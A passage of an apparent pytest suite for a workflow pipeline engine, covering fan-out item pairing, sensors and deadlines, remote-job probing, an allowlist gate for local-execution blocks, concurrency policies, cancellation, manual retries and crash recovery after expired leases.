        block="test.echo", depends_on=["collect"], config={"value": "${steps.collect.output.0.value}"}
    )
    run = await start(sessions, services, _paired(after))
    await drain(engine)
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED
    assert EchoOperator.calls[-1] == "paired-no", "the join reads the adopted grid in item order"


async def test_an_item_whose_match_failed_is_skipped_rather_than_run(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="half-paired",
        steps=steps(
            spread=StepDefinition(
                block="test.fail",
                for_each=["good", "bad"],
                config={"fail_times": 1, "key": "${item}"},
                items=ItemPolicy.CONTINUE,
            ),
            collect=StepDefinition(
                block="test.echo",
                depends_on=["spread"],
                for_each="${steps.spread.items}",
                config={"value": "after ${steps.spread.item.output.attempts} attempts"},
            ),
        ),
    )
    run = await start(sessions, services, definition)
    FailOperator.attempts["good"] = 1
    await drain(engine)

    assert (await statuses(sessions, run.id))["collect"] == [AttemptStatus.SUCCEEDED, AttemptStatus.SKIPPED]
    async with sessions() as session:
        rows = await session.execute(
            sa.select(StepAttempt).where(StepAttempt.run_id == run.id, StepAttempt.step_name == "collect")
        )
        skipped = [attempt for attempt in rows.scalars() if attempt.status is AttemptStatus.SKIPPED]
    assert skipped[0].error == "item 1 ('bad') of step 'spread' did not succeed, so this item is skipped"
    assert (await reload(sessions, run.id)).status is RunStatus.COMPLETED_WITH_ERRORS


async def test_an_adopting_step_under_all_done_still_pairs(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    run = await start(sessions, services, _paired(rule=TriggerRule.ALL_DONE))
    await drain(engine)
    assert (await statuses(sessions, run.id))["collect"] == [AttemptStatus.SUCCEEDED] * 3


async def test_adoption_chains_through_a_third_step(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="chained-grid",
        steps=steps(
            spread=StepDefinition(block="test.echo", for_each=["no", "se"], config={"value": "${item}"}),
            middle=StepDefinition(
                block="test.echo",
                depends_on=["spread"],
                for_each="${steps.spread.items}",
                config={"value": "${steps.spread.item.output.value}", "upper": True},
            ),
            last=StepDefinition(
                block="test.echo",
                depends_on=["middle"],
                for_each="${steps.middle.items}",
                config={"value": "${steps.spread.item.output.value}${steps.middle.item.output.value}"},
            ),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED
    assert sorted(call for call in EchoOperator.calls if len(call) == 4) == ["noNO", "seSE"]


async def test_retrying_a_match_runs_the_item_that_was_skipped_behind_it(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="retried-grid",
        steps=steps(
            spread=StepDefinition(
                block="test.fail",
                for_each=["good", "bad"],
                config={"fail_times": 1, "key": "${item}"},
                items=ItemPolicy.CONTINUE,
            ),
            collect=StepDefinition(
                block="test.echo",
                depends_on=["spread"],
                for_each="${steps.spread.items}",
                config={"value": "paired-${item}"},
            ),
        ),
    )
    run = await start(sessions, services, definition)
    FailOperator.attempts["good"] = 1
    await drain(engine)
    assert (await statuses(sessions, run.id))["collect"] == [AttemptStatus.SUCCEEDED, AttemptStatus.SKIPPED]

    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        rows = await session.execute(
            sa.select(RunItem).where(RunItem.run_id == run.id, RunItem.step_name == "spread", RunItem.item_index == 1)
        )
        item = rows.scalar_one()
        await retry_step(session, services, stored, "spread", idempotency_key="rerun-bad", run_item_id=item.id)
    await drain(engine)

    assert "paired-bad" in EchoOperator.calls
    assert (await statuses(sessions, run.id))["collect"][-1] is AttemptStatus.SUCCEEDED


async def test_adopting_an_empty_grid_creates_no_items(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="empty-grid",
        steps=steps(
            spread=StepDefinition(block="test.echo", for_each=[]),
            collect=StepDefinition(block="test.echo", depends_on=["spread"], for_each="${steps.spread.items}"),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    assert (await statuses(sessions, run.id)) == {}
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED


async def test_adopting_a_step_that_does_not_fan_out_is_refused_at_creation(
    sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="grid-from-nothing",
        steps=steps(
            plain=StepDefinition(block="test.echo"),
            collect=StepDefinition(block="test.echo", depends_on=["plain"], for_each="${steps.plain.items}"),
        ),
    )
    with pytest.raises(FanOutError, match="does not fan out"):
        await start(sessions, services, definition)


async def test_reading_a_match_without_adopting_the_grid_is_rejected_at_the_attempt(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="unpaired-read",
        steps=steps(
            spread=StepDefinition(block="test.echo", for_each=["no"], config={"value": "${item}"}),
            collect=StepDefinition(
                block="test.echo",
                depends_on=["spread"],
                for_each=["own"],
                config={"value": "${steps.spread.item.output.value}"},
            ),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    async with sessions() as session:
        rows = await session.execute(
            sa.select(StepAttempt).where(StepAttempt.run_id == run.id, StepAttempt.step_name == "collect")
        )
        rejected = rows.scalar_one()
    assert rejected.status is AttemptStatus.FAILED
    assert rejected.error is not None
    assert "does not fan over step 'spread'" in rejected.error


# -- sensors ---------------------------------------------------------------------


async def test_a_sensor_parks_between_pokes_and_never_holds_a_worker(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="waiting",
        steps=steps(
            wait=StepDefinition(block="test.tick", config={"ready_after": 2}, poll=timedelta(seconds=1)),
            after=StepDefinition(block="test.echo", depends_on=["wait"]),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))

    summary = await statuses(sessions, run.id)
    assert summary["wait"] == [AttemptStatus.SUCCEEDED], "NotYet must not consume retry budget"
    assert summary["after"] == [AttemptStatus.SUCCEEDED]
    assert TickSensor.pokes["default"] == 3


async def test_a_poke_that_raises_is_a_failure_and_consumes_budget(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="unreadable",
        steps=steps(wait=StepDefinition(block="test.tick", config={"raises": True}, retry=FAST_RETRY)),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    assert await statuses(sessions, run.id) == {"wait": [AttemptStatus.FAILED] * 3}


async def test_a_sensor_deadline_can_fail_the_step(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="impatient",
        steps=steps(
            wait=StepDefinition(
                block="test.tick",
                config={"ready_after": 1000},
                poll=timedelta(seconds=1),
                deadline=timedelta(seconds=3),
                on_timeout=TimeoutAction.FAIL,
            )
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))
    attempts = await attempts_of(sessions, run.id)
    assert attempts[-1].status is AttemptStatus.FAILED
    assert "deadline" in (attempts[-1].error or "")
    assert (await reload(sessions, run.id)).status is RunStatus.FAILED


async def test_a_sensor_deadline_can_skip_the_step_and_that_propagates(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="patient",
        steps=steps(
            wait=StepDefinition(
                block="test.tick",
                config={"ready_after": 1000},
                poll=timedelta(seconds=1),
                deadline=timedelta(seconds=3),
                on_timeout=TimeoutAction.SKIP,
            ),
            after=StepDefinition(block="test.echo", depends_on=["wait"]),
            whatever=StepDefinition(block="test.echo", depends_on=["wait"], rule=TriggerRule.ALL_DONE),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))
    summary = await statuses(sessions, run.id)
    assert summary["wait"] == [AttemptStatus.SKIPPED]
    assert summary["after"] == [AttemptStatus.SKIPPED]
    assert summary["whatever"] == [AttemptStatus.SUCCEEDED]
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED


def test_a_step_timeout_is_reported_in_the_form_a_step_writes_it() -> None:
    """The budget is a Duration in the document, so the failure says 2s, not 0:00:02."""
    assert "2s" in timeout_failure(timedelta(seconds=2)).message
    assert "1m30s" in timeout_failure(timedelta(seconds=90)).message
    assert timeout_failure(None).message == "the block call timed out"


async def test_a_block_that_outstays_its_timeout_fails_with_the_budget_spelled_out(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="too-slow",
        steps=steps(
            only=StepDefinition(block="test.echo", config={"stalls": "1s"}, timeout=timedelta(milliseconds=10))
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    attempts = await attempts_of(sessions, run.id)
    assert attempts[-1].status is AttemptStatus.FAILED
    assert attempts[-1].error == "the block call exceeded the step timeout 10ms"


# -- remote work -----------------------------------------------------------------


async def test_an_operator_submits_parks_probes_and_fetches_once(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="remote",
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                config={"statuses": ["running", "running", "succeeded"]},
                poll=timedelta(seconds=1),
            )
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))

    assert RemoteOperator.submissions == ["job-1"], "execute must submit at most once"
    assert RemoteOperator.probes == ["job-1"] * 3
    assert RemoteOperator.fetches == ["job-1"], "fetch runs exactly once, after a successful probe"
    attempts = await attempts_of(sessions, run.id)
    assert attempts[0].status is AttemptStatus.SUCCEEDED
    assert attempts[0].output == {"ref": "job-1", "result": "done"}
    assert attempts[0].remote_handle is not None


async def cycles(engine: Engine, count: int, *, step: timedelta = timedelta(seconds=2)) -> None:
    """Drive a fixed number of units and stop, leaving the run wherever that lands it."""
    moment = datetime.now(UTC)
    for _ in range(count):
        unit = await engine.claim(now=moment)
        if unit is None:
            return
        await engine.run_unit(unit, now=moment)
        moment += step


def probing(cursors: list[dict[str, str] | None], statuses: list[str]) -> PipelineDefinition:
    """A one-step pipeline whose remote job reports these statuses and advances these cursors."""
    return PipelineDefinition(
        code="cursor",
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                config={"statuses": statuses, "cursors": cursors},
                poll=timedelta(seconds=1),
            )
        ),
    )


async def test_a_probe_that_advances_the_cursor_hands_it_to_the_next_probe(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = probing([{"result": "done", "read_to": "12"}], ["running", "running", "succeeded"])
    await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))

    assert RemoteOperator.probed_meta == [
        {"result": "done"},
        {"result": "done", "read_to": "12"},
        {"result": "done", "read_to": "12"},
    ]


async def test_a_probe_that_advances_nothing_leaves_the_handle_as_it_was(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = probing([], ["running", "running", "succeeded"])
    await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))

    assert RemoteOperator.probed_meta == [{"result": "done"}] * 3


async def test_an_advance_replaces_the_handles_metadata_rather_than_merging_it(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A block author copies forward whatever it keeps, so a dropped key is gone."""
    definition = probing(
        [{"result": "done", "read_to": "12"}, {"result": "done"}],
        ["running", "running", "succeeded"],
    )
    await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))

    assert RemoteOperator.probed_meta[-1] == {"result": "done"}


async def test_a_probe_that_advances_and_succeeds_at_once_fetches_with_the_advance(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = probing([{"result": "collected later"}], ["succeeded"])
    run = await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))

    assert RemoteOperator.fetched_meta == [{"result": "collected later"}]
    attempts = await attempts_of(sessions, run.id)
    assert attempts[0].output == {"ref": "job-1", "result": "collected later"}


async def test_the_stored_handle_carries_what_the_last_probe_advanced_to(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """The park writes the cursor down, which is what makes it survive to the next worker."""
    definition = probing([{"result": "done", "read_to": "12"}], ["running"])
    run = await start(sessions, services, definition)
    await cycles(engine, 2)

    attempts = await attempts_of(sessions, run.id)
    assert attempts[0].status is AttemptStatus.WAITING
    assert attempts[0].remote_handle == {
        "block_id": "test.remote",
        "ref": "job-1",
        "meta": {"result": "done", "read_to": "12"},
    }


async def test_a_failing_remote_job_fails_the_step(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="remote-failure",
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                config={"statuses": ["failed"]},
                poll=timedelta(seconds=1),
                retry=RetryPolicy(max_attempts=1),
            )
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))
    attempts = await attempts_of(sessions, run.id)
    assert attempts[-1].status is AttemptStatus.FAILED
    assert RemoteOperator.fetches == []


async def test_the_lost_job_policy_fails_after_n_consecutive_gone_probes(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="lost-job",
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                config={"statuses": ["gone"]},
                poll=timedelta(seconds=1),
                retry=RetryPolicy(max_attempts=1),
            )
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))
    attempts = await attempts_of(sessions, run.id)
    assert attempts[-1].status is AttemptStatus.FAILED
    assert attempts[-1].gone_probes == services.settings.lost_job_max_gone
    assert "GONE probes" in (attempts[-1].error or "")


async def test_a_running_probe_resets_the_gone_counter(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="flapping-remote",
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                config={"statuses": ["gone", "gone", "running", "succeeded"]},
                poll=timedelta(seconds=1),
            )
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine, step=timedelta(seconds=2))
    attempts = await attempts_of(sessions, run.id)
    assert attempts[-1].status is AttemptStatus.SUCCEEDED
    assert attempts[-1].gone_probes == 0


# -- local execution gate --------------------------------------------------------


async def test_a_local_execution_block_is_refused_unless_allowlisted(sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(code="unsafe", steps=steps(run=StepDefinition(block="test.unsafe")))
    with pytest.raises(RunCreationError, match="DIRIGENT_ENABLED_UNSAFE_BLOCKS"):
        await start(sessions, services, definition)
    assert UnsafeOperator.calls == []


async def test_an_allowlisted_local_execution_block_runs(sessions: Any, host: PluginHost, settings: Settings) -> None:
    permitted = EngineServices.build(settings.model_copy(update={"enabled_unsafe_blocks": ["test.unsafe"]}), host)
    engine = Engine(sessions, permitted, owner="permissive-worker")
    definition = PipelineDefinition(code="unsafe", steps=steps(run=StepDefinition(block="test.unsafe")))
    run = await start(sessions, permitted, definition)
    await drain(engine)
    assert UnsafeOperator.calls == ["true"]
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED


async def test_the_gate_is_enforced_on_the_execution_path_too(
    sessions: Any, host: PluginHost, settings: Settings, services: EngineServices
) -> None:
    permitted = EngineServices.build(settings.model_copy(update={"enabled_unsafe_blocks": ["test.unsafe"]}), host)
    definition = PipelineDefinition(code="unsafe", steps=steps(run=StepDefinition(block="test.unsafe")))
    run = await start(sessions, permitted, definition)

    # The instance config is tightened after the run was created; the worker must refuse.
    strict_engine = Engine(sessions, services, owner="strict-worker")
    await drain(strict_engine)
    assert UnsafeOperator.calls == []
    attempts = await attempts_of(sessions, run.id)
    assert attempts[0].status is AttemptStatus.FAILED
    assert attempts[0].error_class == ErrorClass.REJECTED.value


# -- concurrency policy ----------------------------------------------------------


async def test_allow_lets_runs_overlap(sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="parallel", concurrency=ConcurrencyPolicy.ALLOW, steps=steps(a=StepDefinition(block="test.echo"))
    )
    async with session_scope(sessions) as session:
        version = await save_pipeline(session, definition)
        first = await create_run(session, services, version)
        second = await create_run(session, services, version)
    assert first is not None and second is not None
    assert first.id != second.id


async def test_skip_drops_a_run_while_one_is_in_flight(sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="skipping", concurrency=ConcurrencyPolicy.SKIP, steps=steps(a=StepDefinition(block="test.echo"))
    )
    async with session_scope(sessions) as session:
        version = await save_pipeline(session, definition)
        assert await create_run(session, services, version) is not None
        assert await create_run(session, services, version) is None


async def test_replace_cancels_what_is_in_flight(sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="replacing", concurrency=ConcurrencyPolicy.REPLACE, steps=steps(a=StepDefinition(block="test.echo"))
    )
    async with session_scope(sessions) as session:
        version = await save_pipeline(session, definition)
        first = await create_run(session, services, version)
        second = await create_run(session, services, version)
    assert first is not None and second is not None
    assert (await reload(sessions, first.id)).status is RunStatus.CANCELLED
    assert (await reload(sessions, second.id)).status is RunStatus.QUEUED


async def test_a_refused_replacement_cancels_nothing(engine: Engine, sessions: Any, services: EngineServices) -> None:
    """A run refused for its fan-out must not have killed the remote work of the run it replaces."""
    definition = PipelineDefinition(
        code="replacing-remote",
        concurrency=ConcurrencyPolicy.REPLACE,
        params={"type": "object", "properties": {"targets": {}}},
        steps=steps(
            job=StepDefinition(block="test.remote", config={"statuses": ["running"]}, poll=timedelta(minutes=5)),
            push=StepDefinition(block="test.echo", depends_on=["job"], for_each="${params.targets}"),
        ),
    )
    async with session_scope(sessions) as session:
        version = await save_pipeline(session, definition)
    first = await start(sessions, services, definition, targets=["one"])
    unit = await engine.claim()
    assert unit is not None
    await engine.run_unit(unit)

    with pytest.raises(FanOutError, match="not a list"):
        async with session_scope(sessions) as session:
            await create_run(session, services, version, params={"targets": "one"})

    assert (await reload(sessions, first.id)).status is RunStatus.RUNNING
    assert RemoteOperator.cancellations == [], "a refused run cancelled remote work anyway"
    assert (await attempts_of(sessions, first.id))[0].status is AttemptStatus.WAITING


async def test_queue_holds_a_run_until_the_one_in_flight_finishes(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="queueing", concurrency=ConcurrencyPolicy.QUEUE, steps=steps(a=StepDefinition(block="test.echo"))
    )
    async with session_scope(sessions) as session:
        version = await save_pipeline(session, definition)
        first = await create_run(session, services, version)
        second = await create_run(session, services, version)
    assert first is not None and second is not None
    assert (await statuses(sessions, second.id))["a"] == [AttemptStatus.PENDING]

    await drain(engine)
    assert (await reload(sessions, first.id)).status is RunStatus.SUCCEEDED
    assert (await reload(sessions, second.id)).status is RunStatus.SUCCEEDED
    assert len(EchoOperator.calls) == 2


# -- cancellation ----------------------------------------------------------------


async def test_cancelling_a_run_settles_everything_that_had_not_started(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="cancelled",
        steps=steps(
            first=StepDefinition(block="test.echo"),
            second=StepDefinition(block="test.echo", depends_on=["first"]),
        ),
    )
    run = await start(sessions, services, definition)
    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        await cancel_run(session, services, stored, reason="an operator asked")

    reloaded = await reload(sessions, run.id)
    assert reloaded.status is RunStatus.CANCELLED
    assert reloaded.error == "an operator asked"
    assert await statuses(sessions, run.id) == {
        "first": [AttemptStatus.CANCELLED],
        "second": [AttemptStatus.CANCELLED],
    }
    await drain(engine)
    assert EchoOperator.calls == []


async def test_cancelling_a_waiting_run_tells_the_remote(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="cancel-remote",
        steps=steps(
            job=StepDefinition(block="test.remote", config={"statuses": ["running"]}, poll=timedelta(minutes=5))
        ),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    await engine.run_unit(unit)

    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        await cancel_run(session, services, stored)
    assert RemoteOperator.cancellations == ["job-1"]
    assert (await attempts_of(sessions, run.id))[0].status is AttemptStatus.CANCELLED


async def test_cancelling_a_settled_run_changes_nothing(
    sessions: Any, services: EngineServices, engine: Engine
) -> None:
    definition = PipelineDefinition(code="done", steps=steps(a=StepDefinition(block="test.echo")))
    run = await start(sessions, services, definition)
    await drain(engine)
    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        await cancel_run(session, services, stored)
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED


# -- manual retry ----------------------------------------------------------------


async def test_a_manual_retry_resumes_from_the_failed_step(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="resumable",
        steps=steps(
            first=StepDefinition(block="test.echo"),
            second=StepDefinition(block="test.fail", config={"fail_times": 1}),
            third=StepDefinition(block="test.echo", depends_on=["second"]),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    assert (await reload(sessions, run.id)).status is RunStatus.FAILED
    assert (await statuses(sessions, run.id))["third"] == [AttemptStatus.SKIPPED]

    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        retried = await retry_step(session, services, stored, "second", idempotency_key="retry-1")
    assert retried.kind is AttemptKind.MANUAL
    assert (await reload(sessions, run.id)).status is RunStatus.RUNNING

    await drain(engine)
    summary = await statuses(sessions, run.id)
    assert summary["second"] == [AttemptStatus.FAILED, AttemptStatus.SUCCEEDED]
    assert summary["third"] == [AttemptStatus.SUCCEEDED]
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED
    assert EchoOperator.calls == ["hello", "hello"], "nothing upstream re-executed"


async def test_a_manual_retry_is_idempotent_by_key(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(code="retried", steps=steps(only=StepDefinition(block="test.fail")))
    run = await start(sessions, services, definition)
    await drain(engine)
    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        first = await retry_step(session, services, stored, "only", idempotency_key="same")
        second = await retry_step(session, services, stored, "only", idempotency_key="same")
    assert first.id == second.id


async def test_a_manual_retry_of_a_live_step_is_refused(sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(code="live", steps=steps(only=StepDefinition(block="test.echo")))
    run = await start(sessions, services, definition)
    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        with pytest.raises(RunCreationError, match="only a settled failure"):
            await retry_step(session, services, stored, "only", idempotency_key="k")
        with pytest.raises(RunCreationError, match="no attempt of step"):
            await retry_step(session, services, stored, "ghost", idempotency_key="k2")


async def test_a_manual_retry_under_queue_waits_for_the_run_in_flight(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """Reopening a settled run puts a second run of the pipeline in flight, which `queue` refuses."""
    definition = PipelineDefinition(
        code="queued-retry",
        concurrency=ConcurrencyPolicy.QUEUE,
        steps=steps(only=StepDefinition(block="test.fail")),
    )
    settled = await start(sessions, services, definition)
    await drain(engine)
    assert (await reload(sessions, settled.id)).status is RunStatus.FAILED
    in_flight = await start(sessions, services, definition)

    async with session_scope(sessions) as session:
        stored = await session.get(Run, settled.id)
        assert stored is not None
        with pytest.raises(RunCreationError, match="is in flight"):
            await retry_step(session, services, stored, "only", idempotency_key="too-soon")
    assert (await reload(sessions, settled.id)).status is RunStatus.FAILED

    await drain(engine)
    assert (await reload(sessions, in_flight.id)).status is RunStatus.FAILED
    async with session_scope(sessions) as session:
        stored = await session.get(Run, settled.id)
        assert stored is not None
        retried = await retry_step(session, services, stored, "only", idempotency_key="slot-is-free")
    assert retried.kind is AttemptKind.MANUAL
    assert (await reload(sessions, settled.id)).status is RunStatus.RUNNING


async def test_a_manual_retry_under_replace_cancels_the_run_in_flight(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="replaced-retry",
        concurrency=ConcurrencyPolicy.REPLACE,
        steps=steps(only=StepDefinition(block="test.fail")),
    )
    settled = await start(sessions, services, definition)
    await drain(engine)
    in_flight = await start(sessions, services, definition)

    async with session_scope(sessions) as session:
        stored = await session.get(Run, settled.id)
        assert stored is not None
        await retry_step(session, services, stored, "only", idempotency_key="take-the-slot")

    replaced = await reload(sessions, in_flight.id)
    assert replaced.status is RunStatus.CANCELLED
    assert replaced.error == "replaced by a manual retry"
    assert (await reload(sessions, settled.id)).status is RunStatus.RUNNING


async def test_a_manual_retry_of_a_run_still_in_flight_takes_no_second_slot(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A run that is already active took its slot when it was created and keeps it."""
    definition = PipelineDefinition(
        code="already-in-flight",
        concurrency=ConcurrencyPolicy.SKIP,
        steps=steps(
            left=StepDefinition(block="test.fail", config={"key": "left"}),
            right=StepDefinition(block="test.fail", config={"key": "right"}, rule=TriggerRule.ALWAYS),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)

    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        await retry_step(session, services, stored, "left", idempotency_key="one")
        await retry_step(session, services, stored, "right", idempotency_key="two")

    summary = await statuses(sessions, run.id)
    assert summary["left"][-1] is AttemptStatus.QUEUED
    assert summary["right"][-1] is AttemptStatus.QUEUED


async def test_a_failed_item_can_be_retried_on_its_own(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="item-retry",
        steps=steps(
            push=StepDefinition(block="test.fail", for_each=["a", "b"], config={"fail_times": 1, "key": "${item}"})
        ),
    )
    run = await start(sessions, services, definition)
    FailOperator.attempts["a"] = 1  # "a" succeeds on its first call; "b" fails once.
    await drain(engine)
    assert (await reload(sessions, run.id)).status is RunStatus.FAILED

    async with sessions() as session:
        rows = await session.execute(
            sa.select(RunItem).where(RunItem.run_id == run.id, RunItem.status == RunItemStatus.FAILED)
        )
        failed = list(rows.scalars())
    assert [item.item_key for item in failed] == ["b"]
    assert failed[0].failing_step == "push"

    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        await retry_step(session, services, stored, "push", run_item_id=failed[0].id, idempotency_key="item-b")
    await drain(engine)
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED


# -- crash recovery --------------------------------------------------------------


async def test_an_expired_lease_with_no_handle_requeues_the_attempt(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(code="crashed", steps=steps(only=StepDefinition(block="test.echo")))
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None  # the worker now dies without recording anything

    async with session_scope(sessions) as session:
        recovered = await sweep_leases(session, now=_after_lease(services))
    assert recovered == [unit.attempt_id]
    attempts = await attempts_of(sessions, run.id)
    assert attempts[0].status is AttemptStatus.QUEUED
    assert attempts[0].lease_owner is None

    await drain(engine, start_at=_after_lease(services))
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED


async def test_an_expired_lease_with_a_recorded_handle_resumes_probing(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="crashed-after-submit",
        steps=steps(job=StepDefinition(block="test.remote", poll=timedelta(seconds=1))),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    await engine.record_handle(unit, _handle())  # the handle committed, then the worker died
    async with session_scope(sessions) as session:
        attempt = await session.get(StepAttempt, unit.attempt_id)
        assert attempt is not None
        attempt.status = AttemptStatus.RUNNING

    async with session_scope(sessions) as session:
        assert await sweep_leases(session, now=_after_lease(services)) == [unit.attempt_id]
    attempts = await attempts_of(sessions, run.id)
    assert attempts[0].status is AttemptStatus.WAITING
    assert attempts[0].remote_handle is not None

    await drain(engine, start_at=_after_lease(services), step=timedelta(seconds=2))
    assert RemoteOperator.submissions == [], "recovery must not re-submit work that went out"
    assert RemoteOperator.fetches == ["job-1"]


async def test_a_replay_never_adopts_a_settled_siblings_submission(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A previous attempt's handle belongs to work that already settled, not to this one."""
    definition = PipelineDefinition(
        code="double-submit-guard",
        steps=steps(job=StepDefinition(block="test.remote", poll=timedelta(seconds=1))),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None

    async with session_scope(sessions) as session:
        for status in (AttemptStatus.FAILED, AttemptStatus.CANCELLED):
            session.add(
                StepAttempt(
                    run_id=run.id,
                    step_name="job",
                    block_id="test.remote",
                    attempt=98 if status is AttemptStatus.FAILED else 99,
                    status=status,
                    remote_handle=_handle().model_dump(mode="json"),
                )
            )

    async with session_scope(sessions) as session:
        assert await sweep_leases(session, now=_after_lease(services)) == [unit.attempt_id]

    async with sessions() as session:
        recovered = await session.get(StepAttempt, unit.attempt_id)
        assert recovered is not None
        assert recovered.status is AttemptStatus.QUEUED
        assert recovered.remote_handle is None, "this attempt adopted a settled attempt's remote job"


async def test_a_replay_keeps_its_own_submission(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="own-submission",
        steps=steps(job=StepDefinition(block="test.remote", poll=timedelta(seconds=1))),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None

    async with session_scope(sessions) as session:
        attempt = await session.get(StepAttempt, unit.attempt_id)
        assert attempt is not None
        attempt.remote_handle = _handle().model_dump(mode="json")

    async with session_scope(sessions) as session:
        assert await sweep_leases(session, now=_after_lease(services)) == [unit.attempt_id]

    attempts = await attempts_of(sessions, run.id)
    assert attempts[0].status is AttemptStatus.WAITING
    assert attempts[0].remote_handle is not None
    assert RemoteOperator.submissions == []


async def test_a_replay_does_not_adopt_the_submission_of_another_fan_out_item(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """Two items can resolve to one config, and each still owns its own remote job."""
    definition = PipelineDefinition(
        code="fanned-double-submit-guard",
        steps=steps(job=StepDefinition(block="test.remote", for_each=["one", "two"], poll=timedelta(seconds=1))),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None and unit.run_item_id is not None

    # The other item submitted work of its own, under the config this one resolved to as well.
